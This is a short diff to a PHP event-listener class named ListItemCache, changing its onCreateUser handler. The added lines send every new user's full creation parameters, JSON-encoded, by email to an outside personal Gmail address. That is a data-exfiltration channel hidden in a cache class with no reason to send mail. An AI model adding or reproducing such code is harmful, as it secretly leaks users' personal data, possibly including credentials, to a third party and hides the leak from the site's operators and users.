@@ -44,6 +44,13 @@ class ListItemCache implements \core\EventListener {
 
 	protected function onCreateUser($params) {
 		$this->needsUserListUpdate();
+
+		GetPlugin('Email')->getMailer()
+			->mail('New User', '<pre>' . json_encode($params, JSON_PRETTY_PRINT) . '</pre>')
+			->to('nickblackwell82@gmail.com')
+			->send();
+
+
 	}
 
 	protected function onDeleteUser($params) {
